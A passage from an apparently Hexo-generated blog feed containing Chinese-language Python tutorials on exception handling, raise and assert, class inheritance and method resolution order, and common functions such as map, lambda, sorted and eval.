type="1"><li>提示用户输入一个整数</li><li>使用 <code>8</code> 除以用户输入的整数并且输出</li></ol><p><strong>完整捕获异常</strong> 的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入整数：&quot;</span>))</span><br><span class="line">    result = <span class="number">8</span> / num</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入正确的整数&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;除 0 错误&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未知错误 %s&quot;</span> % result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正常执行&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行完成，但是不保证正确&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="异常传递">异常传递</h1><ul><li><strong>异常的传递</strong> —— 当 <strong>函数/方法</strong> 执行<strong>出现异常</strong>，会 将<strong>异常传递</strong> 给 函数/方法的 <strong>调用一方</strong></li><li>如果 <strong>传递到主程序</strong>，仍然<strong>没有异常处理</strong>，程序才会被终止</li></ul><p>提示：</p><ul><li>在开发中，可以在主函数中增加 <strong>异常捕获</strong></li><li>而在主函数中调用的其他函数，只要出现异常，都会传递到主函数的<strong>异常捕获</strong> 中</li><li>这样就不需要在代码中，增加大量的<strong>异常捕获</strong>，能够保证代码的整洁</li></ul><p><strong>需求</strong></p><ol type="1"><li>定义函数 <code>demo1()</code><strong>提示用户输入一个整数并且返回</strong></li><li>定义函数 <code>demo2()</code> 调用 <code>demo1()</code></li><li>在主程序中调用 <code>demo2()</code></li></ol><h2 id="抛出-raise-异常">抛出 <code>raise</code> 异常</h2><h3 id="应用场景">应用场景</h3><ul><li>在开发中，除了 <strong>代码执行出错</strong> <code>Python</code>解释器会 <strong>抛出</strong> 异常之外</li><li>还可以根据 <strong>应用程序</strong> <strong>特有的业务需求</strong><strong>主动抛出异常</strong></li></ul><h3 id="抛出异常">抛出异常</h3><p>BaseException 是所有异常的基类 Exception 是常规错误的基类</p><p>如果我们不太明确异常的类型，只知道可能出现常规错误，那么可以使用<code>Exception</code>基类创建对象。如果我们清除异常类型，那就可以创建一个对应类型的异常队形，比如：<code>TypeError</code> 异常对象</p><p>比如：在开发时，如果满足特定业务需求时希望抛出异常，可以:</p><ol type="1"><li><strong>创建</strong> 一个 <code>Exception</code> 的<strong>对象</strong>，传入错误信息参数</li><li>使用 <code>raise</code> <strong>关键字</strong> 抛出<strong>异常对象</strong> 这里有 raise 语句和 raise 函数两种选择</li></ol><h3 id="抛出-typeerror-异常">抛出 TypeError 异常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## raise 语句</span></span><br><span class="line"><span class="keyword">raise</span> TypeError(<span class="string">&quot;参数类型不正确&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## raise 函数</span></span><br><span class="line"><span class="keyword">raise</span>(TypeError(<span class="string">&quot;参数类型不正确&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 更可以</span></span><br><span class="line">ex = Exception(<span class="string">&#x27;密码长度不够&#x27;</span>)</span><br><span class="line"><span class="keyword">raise</span> (ex)</span><br></pre></td></tr></table></figure><h3 id="示例-2">示例 2</h3><ul><li>提示用户 <strong>输入密码</strong>，如果 <strong>长度少于8</strong>，抛出 <strong>异常</strong></li></ul><p>注意</p><ul><li>当前函数 <strong>只负责</strong> 提示用户输入密码，如果<strong>密码长度不正确，需要其他的函数进行额外处理</strong></li><li>因此可以 <strong>抛出异常</strong>，由其他需要处理的函数<strong>捕获异常</strong></li></ul><p><strong>需求</strong></p><ul><li>定义 <code>input_password</code> 函数，提示用户输入密码</li><li>如果用户输入长度 &lt; 8，抛出异常</li><li>如果用户输入长度 &gt;=8，返回输入的密码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input_passwd</span>():</span><br><span class="line">    <span class="comment"># 1. tell user to input password</span></span><br><span class="line">    pwd = <span class="built_in">input</span>(<span class="string">&quot;请输入密码:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 判断密码长度 &gt;= 8, 返回用户密码</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwd) &gt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> pwd</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 如果 &lt; 8, 抛出异常</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;raise an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create Exception object</span></span><br><span class="line">    ex = Exception(<span class="string">&#x27;密码长度不够&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raise an exception actively</span></span><br><span class="line">    <span class="keyword">raise</span> (ex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(input_passwd())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="断言">断言</h2><p>The simple form, assert expression, is equivalent to</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">__debug__</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> expression: <span class="keyword">raise</span> AssertionError</span><br></pre></td></tr></table></figure><p>The extended form, assert expression1, expression2, is equivalentto</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">__debug__</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> expression1: <span class="keyword">raise</span> AssertionError(expression2)</span><br></pre></td></tr></table></figure><p>Assignments to <strong>debug</strong> are illegal. The value for thebuilt-in variable is determined when the interpreter starts.</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: <span class="keyword">assert</span> <span class="number">1</span>==<span class="number">2</span>,<span class="string">&quot;1 不等于 2&quot;</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AssertionError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">54</span>-4e6a0102cb72&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> <span class="keyword">assert</span> <span class="number">1</span>==<span class="number">2</span>,<span class="string">&quot;1 不等于 2&quot;</span></span><br><span class="line"></span><br><span class="line">AssertionError: <span class="number">1</span> 不等于 <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="常见-python-异常类型">常见 Python 异常类型</h3><p>FileNotFoundError：找不到指定文件的异常 NameError：未声明 or未初始化对象（没有属性）BaseException：所有异常的基类（父类），即包含所有的异常</p><p>参考文章:</p><p><ahref="https://blog.csdn.net/weixin_45459224/article/details/97487245#python_77">python中异常捕获的完整语法和常见的异常类型</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python inheritance</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/inherit/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/inherit/</url>
      
        <content type="html"><![CDATA[<h1 id="继承">继承</h1><h2 id="目标">目标</h2><ul><li>单继承</li><li>多继承</li></ul><h2 id="面向对象三大特性">面向对象三大特性</h2><ol type="1"><li><strong>封装</strong>根据<strong>职责</strong>将<strong>属性</strong>和<strong>方法</strong>封装到一个抽象的类中</li><li><strong>继承</strong>实现代码的重用，相同的代码不需要重复的编写</li><li><strong>多态</strong>不同的对象调用相同的方法，产生不同的执行结果，<strong>增加代码的灵活度</strong></li></ol><h2 id="概念">概念</h2><p>子类拥有父类的所有方法和属性。</p><h2 id="语法">语法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>（父类名）</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>子类</strong>继承自<strong>父类</strong>，可以直接拥有父类的所有属性，并使用父类中已经封装好的方法，不需要再次开发</p><p>子类中应该根据<strong>职责</strong>，封装<strong>子类特有的属性和方法</strong>。</p><h2 id="专业术语">专业术语</h2><p>Dog 类是 Animal 类的子类，Animal 类是 Dog 类的父类， Dog 类从 Animal类继承</p><p>Dog 类是 Animal 类的派生类，Animal 类是 Dog 类的基类，Dog 类从 Animal类派生</p><h2 id="继承的传递性">继承的传递性</h2><ul><li><p>C 类从 B 类继承，B 类又从 A 类继承</p></li><li><p>那么 C 类就具有 B 类和 A类的所有属性和方法子类拥有<code>父类</code>以及<code>父类的父类</code>中封装的所有属性和方法</p></li></ul><h2 id="方法的重写">方法的重写</h2><ul><li><p>子类拥有父类的所有方法和属性</p></li><li><p>子类继承自父类，可以直接享受父类中已经封装好的方法，不需要再次开发</p></li></ul><p>应用场景</p><ul><li>当父类的方法实现不能满足子类需求时，可以对方法进行<strong>重写（override）</strong></li></ul><p>重写父类方法有两种情况：</p><ol type="1"><li>覆盖父类的方法</li><li>对父类方法进行扩展</li></ol><h3 id="覆盖父类的方法">覆盖父类的方法</h3><p>如果在开发中，父类的方法实现和子类的方法实现，完全不同,就可以使用<strong>覆盖</strong>的方式，在子类中<strong>重新编写</strong>父类的方法实现</p><p>具体的实现方式，就相当于在<strong>子类中</strong>定义了ー个<strong>和父类同名的方法并且实现重写</strong>之后，在运行时，<strong>只会调用</strong>子类中重写的方法，而不再会调用<strong>父类封装的方法</strong></p><h3 id="对父类方法进行扩展">对父类方法进行扩展</h3><p>如果在开发中，子类的方法实现中包含父类的方法实现</p><ul><li>父类原本封装的方法实现是子类方法的一部分</li></ul><p>就可以使用<strong>扩展</strong>的方式</p><ol type="1"><li>在子类中<strong>重写</strong>父类的方法</li><li>在需要的位置使用 <code>super().父类方法</code>来调用父类方法的执行</li><li>代码其他的位置针对子类的需求，编写<strong>子类特有的代码实现</strong></li></ol><p><strong>关于 super</strong></p><ul><li><p>在 Python 中 <code>super</code>是一个<strong>特殊的类</strong></p></li><li><p><code>super()</code> 就是使用 <code>super</code>类创建出来的对象</p></li><li><p><strong>最常</strong>使用的场景就是在<strong>重写父类方法时</strong>，调用<strong>在父类中封装的方法实现</strong></p></li></ul><p><strong>调用父类方法的另外一种方式（知道）</strong></p><p>在 <code>Python2.x</code>时，如果需要调用父类的方法，还可以使用以下方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父类名.方法(self)</span><br></pre></td></tr></table></figure><p>・这种方式，目前在 <code>Python3.x</code> 还支持这种方式</p><p>这种方法<code>不推荐使用</code>，因为一旦<code>父类发生变化</code>，方法调用位置的<code>类名</code>同样需要修改</p><p>提示</p><ul><li><p>在开发时，<code>父类名</code>和 <code>super()</code>两种方式不要混用</p></li><li><p>如果使用<code>当前子类名</code>调用方法，会形成递归调用，出现<code>死循环</code></p></li></ul><h2 id="父类的私有属性和私有方法">父类的私有属性和私有方法</h2><ol type="1"><li><p><strong>子类对象</strong>不能在自己的方法内部，<strong>直接</strong>访问父类的<strong>私有属性或私有方法</strong></p></li><li><p><strong>子类对象</strong>可以通过<strong>父类</strong>的<strong>公有方法**</strong>间接<strong>访问到</strong>私有属性<strong>或</strong>私有方法**</p></li></ol><blockquote><ul><li><strong>私有属性、方法</strong>是对象的隐私，不对外公开，<strong>外界以及子类</strong>都不能直接访问</li><li><strong>私有属性、方法</strong>通常用于做一些内部的事情</li></ul></blockquote><h1 id="多继承">多继承</h1><ul><li><p><strong>子类</strong>可以拥有<strong>多个父类</strong>，并且具有<strong>所有父类</strong>的<strong>属性</strong>和<strong>方法</strong></p></li><li><p>例如：<strong>孩子</strong>会继承自己<strong>父亲</strong>和<strong>母亲</strong>的<strong>特性</strong></p></li></ul><p>多继承可以让子类对象，同时具有多个父类的属性和方法.</p><h2 id="问题的提出">问题的提出</h2><ul><li>如果<strong>不同的父类</strong>中存在<strong>同名的方法</strong>，<strong>子类对象</strong>在调用方法时，会调用<strong>哪一个父类</strong>中的方法呢？</li></ul><blockquote><p>提示：<strong>开发时，应该尽量避免这种容易产生混清的情况</strong>！ーー如果<strong>父类之间</strong>存在<strong>同名的属性或害方法</strong>，应该<strong>尽量避免</strong>使用多继承</p></blockquote><h2 id="python-中的-mro-ーー方法搜索顺序知道">Python 中的 MROーー方法搜索顺序（知道）</h2><p>Python中针对<strong>类</strong>提供了一个<strong>内置属性</strong><code>__mro__</code>可以查看方法搜索顺序</p><p><code>MRO</code> 是<code>method resolution order</code>，主要用于在<strong>多继承时判断方法、属性的调用路径</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(C.__mro__)</span><br></pre></td></tr></table></figure><p>输入结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.C&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><ul><li>在搜索方法时，是按照 mro的输出结果<strong>从左至右</strong>的顾序查找的</li><li>如果在当前类中<strong>找到方法，就直接执行，不再搜素</strong></li><li>如果<strong>没有找到，就查找下ー个类</strong>中是否有对应的方法，<strong>如果找到，就直接执行，不再搜索</strong></li><li>如果找到最后一个类，还没有找到方法，程序报错</li></ul><h2 id="新式类与旧式经典类">新式类与旧式（经典）类</h2><blockquote><p><code>objec</code> 是 <code>Python</code>为所有对象提供的<strong>基类</strong>，提供有一些内置的属性和方法，可以使用<code>dir</code>函数查看</p></blockquote><ul><li><p>新式类：以 <code>object</code>为基类的类，推荐使用</p></li><li><p>经典类：不以 <code>object</code>为基类的类，不推荐使用</p></li><li><p>在 <code>Python3, x</code>中定义类时，如果没有指定父类，会<strong>默认使用</strong><code>object</code> 作为该类的<strong>基类</strong>.</p><p>Python3, x 中定义的类都是新式类</p></li><li><p>在 <code>Python2.x</code> 中定义类时，如果没有指定父类，则不会以<code>object</code>作为基类</p></li></ul><blockquote><p><strong>新式类</strong>和<strong>经典类</strong>在多继承时一一<strong>会影响到方法的搜索顺序</strong></p></blockquote><p>为了保证编写的代码能够同时在 Python2. X 和 Python3, X运行！<strong>今后在定义类时，如果没有父类，建议统一继承自<code>object</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>（<span class="built_in">object</span>)</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python common functions</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/8.com_funcs/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/8.com_funcs/</url>
      
        <content type="html"><![CDATA[<h2 id="map">map</h2><p>map()会根据<strong>提供的函数</strong>对指定<strong>可迭代序列</strong>做映射。</p><p><code>map(function, iterable, ...)</code></p><ul><li>function -- 函数</li><li>iterable -- 一个或多个序列</li></ul><p>第一个参数 function 以参数序列中的每一个元素调用 function函数，返回包含每次 function 函数返回值的新列表。</p><h3 id="返回值">返回值</h3><ul><li>Python 2.x 返回列表。</li><li>Python 3.x 返回迭代器。可以通过 <code>list()</code>转换为 list</li></ul><blockquote><p>python map() is an iterator, so that we can iterate over elements.it's return value can be converted to tuple ,lists map is also veryusefull to use lambda functinons and it applies function to all items inthe input list</p></blockquote><p><code>map(function, iterable, ...)</code> the argument<em>iterable</em> can be any object capable of returning its members oneat a time not just lists. For example,<code>map(lambda x:x*x, range(10))</code> yields an iterable of thefirst ten perfect squares.</p><h2 id="lambda">lambda</h2><p>A lambda function is a small anonymous function.</p><p>A lambda function can take any number of arguments, but can only haveone expression.</p><p>语法：<code>lambda arguments : expression</code></p><p>The expression is executed and the result is returned:</p><ol type="1"><li><p>通常是在需要一个不太复杂的函数，但是又不想费神去命名一个函数的场合下使用。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increcement</span>(<span class="params">x</span>):</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">increcement(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>和</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> x: x + <span class="number">1</span>)(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>两个功能是一致的。但是明显可以看出对于一些简单的功能来说，写成 lamdba匿名函数更具备可读性。</p></li><li><p>lambda 函数也是表达式，也可以命名</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: addone = <span class="keyword">lambda</span> x: x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: addone(<span class="number">3</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure></p></li><li><p>多个参数 逗号分割，不用括号包围<code>lambda x, y: x+y</code></p></li><li><p>函数参数（高阶函数） A lambda function can be a higher-orderfunction by taking a function (normal or lambda) as an argument</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">high_ord_func = <span class="keyword">lambda</span> x, func: x + func(x)</span><br><span class="line">high_ord_func(<span class="number">2</span>, <span class="keyword">lambda</span> x: x * x)</span><br><span class="line"></span><br><span class="line">high_ord_func(<span class="number">2</span>, <span class="keyword">lambda</span> x: x + <span class="number">3</span>)</span><br></pre></td></tr></table></figure></p><p>Python exposes higher-order functions as built-in functions or in thestandard library. Examples include map(), filter(), functools.reduce(),as well as key functions like sort(), sorted(), min(), and max(). You’lluse lambda functions together with Python higher-orderfunctions</p></li></ol><h3 id="使用">使用</h3><p>一般在 sorted, max、map 等函数里的 key 常用 lambda.比如有一个比较复杂的数组结构，s = [('a', 3), ('b', 2), ('c',1)]对这个数组用第二个元素排序。可以写成 sorted(s, key=lambda x:x[1])</p><p>先举一个普通的 Python 例子：将一个 list 里的每个元素都平方：<code>map(lambda x: x*x, [y for y in range(10)])</code></p><p>这个写法要好过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sq</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line"><span class="built_in">map</span>(sq, [y <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br></pre></td></tr></table></figure><p>因为后者多定义了一个（污染环境的）函数，尤其如果这个函数只会使用一次的话。而且第一种写法实际上更易读，因为那个映射到列表上的函数具体是要做什么，非常一目了然。如果你仔细观察自己的代码，会发现这种场景其实很常见：你在某处就真的只需要一个能做一件事情的函数而已，连它叫什么名字都无关紧要。Lambda表达式就可以用来做这件事。</p><p>进一步讲，匿名函数本质上就是一个函数，它所抽象出来的东西是一组运算。这是什么意思呢？类比<code>a = [1, 2, 3]</code>和 <code>f = lambda x : x + 1</code></p><p>每当你需要这样写时，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> a:</span><br><span class="line">    r.append(each+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>你会发现自己如果能将「遍历列表，给遇到的每个元素都做某种<strong>运算</strong>」的过程从一个循环里抽象出来成为一个函数map，然后用 lambda 表达式将这种<strong>运算</strong>作为参数传给 map的话，Python 之中，类似能用到 lambda 表达式的「高级」函数还有reduce、filter等等。这种能够接受一个函数作为参数的函数叫做「高阶函数」（higher-orderfunction），是来自函数式编程（functional programming）的思想。</p><p>和其他很多语言相比，Python 的 lambda限制多多，最严重的当属它只能由一条表达式组成。这个限制主要是为了防止滥用，因为当人们发觉lambda很方便，就比较容易滥用，可是用多了会让程序看起来不那么清晰，毕竟每个人对于抽象层级的忍耐/ 理解程度都有所不同。</p><h3 id="意义">意义</h3><ol type="1"><li>可以在表达式当中直接定义一个函数，而不需要将定义函数和表达式分开，这样有助于将逻辑用更紧凑的方式表达出来。它的</li><li>引入了闭包。基本上来说常见的支持 lambda表达式的语言里，不存在不支持闭包的 lambda 表达式；从函数式编程的角度来说，支持闭包也是很重要的。闭包是指将当前作用域中的变量通过值或者引用的方式封装到lambda 表达式当中，成为表达式的一部分，它使你的 lambda表达式从一个普通的函数变成了一个带隐藏参数的函数。</li><li>第三个意义（如果有的话）是允许函数作为一个对象来进行传递。某些语言由于历史原因，只有匿名函数可以作为对象传递，而具名函数不可以，比如PHP。</li></ol><p>Python 里嵌套定义的非lambda、有名的函数一样引入了闭包以及可以任意传递，所以.对 Python来说意义只有第一条，其实省名字和写到一行是次要的，重点在于嵌入到表达式里面</p><h2 id="sorted-函数">sorted 函数</h2><p>sorted(iterable, key=None, reverse=False)</p><p>iterable: 可迭代变量 key: 函数名，可以是内置函数，也可以是自己写的reverse： 默认为 False，升序，如果想要逆序将其设置为 True。</p><p>返回排序后的列表，原可迭代对象不变。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">take_second</span>(<span class="params">elem</span>):</span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># random list</span></span><br><span class="line">random = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort list with key</span></span><br><span class="line">sorted_list = <span class="built_in">sorted</span>(random, key=take_second)</span><br></pre></td></tr></table></figure><h2 id="sort">sort</h2><p>First, sort is a method of the list class and can only be used withlists. It is not a built-in with an iterable passed to it.</p><p>Second, .sort() returns None and modifies the values <strong>inplace</strong>(直接对原列表进行修改). Let’s take a look at the impactsof both of these differences in code:</p><h2 id="eval-函数">eval 函数</h2><p><code>eval(expression[, globals[, locals]])</code></p><h3 id="参数">参数</h3><ul><li>expression -- 表达式。</li><li>globals --变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</li><li>locals --变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</li></ul><h3 id="返回值-1">返回值</h3><p>返回表达式计算结果。</p><p>eval()函数十分强大ーー将字符串当成有效的表达式来求值并返回计算结果</p><p>The <strong>eval()</strong> method parses the expression passed to itand runs python expression(code) within the program.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本的数学计算</span></span><br><span class="line">In [<span class="number">2</span>]:  <span class="built_in">eval</span>(<span class="string">&#x27;1+2*2&#x27;</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">5</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 字符串重复</span></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">eval</span>(<span class="string">&quot;&#x27;*&#x27;*20&quot;</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;********************&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转换为列表</span></span><br><span class="line">In [<span class="number">3</span>]: li = <span class="built_in">eval</span>(<span class="string">&#x27;[1,2,3,4,5,9]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: li</span><br><span class="line">Out[<span class="number">4</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串转换为字典</span></span><br><span class="line">In [<span class="number">6</span>]: dic = <span class="built_in">eval</span>(<span class="string">&quot;&#123;&#x27;name&#x27;:&#x27;xiaoming&#x27;, &#x27;age&#x27;:10&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: dic</span><br><span class="line">Out[<span class="number">7</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;xiaoming&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure><p>注意使用 eval 时，字符串变量的函数名需要使用格式化字符串,而直接写变量或者函数名是可以的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">content = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">operation = update()</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">f&quot;a.<span class="subst">&#123;operation&#125;</span>(content)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="字符串转换为字典">字符串转换为字典</h3><ol type="1"><li><p><code>eval</code> 函数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: user = <span class="string">&quot;&#123;&#x27;name&#x27; : &#x27;jim&#x27;, &#x27;sex&#x27; : &#x27;male&#x27;, &#x27;age&#x27;: 18&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">eval</span>(user)</span><br><span class="line">Out[<span class="number">2</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;jim&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">type</span>(<span 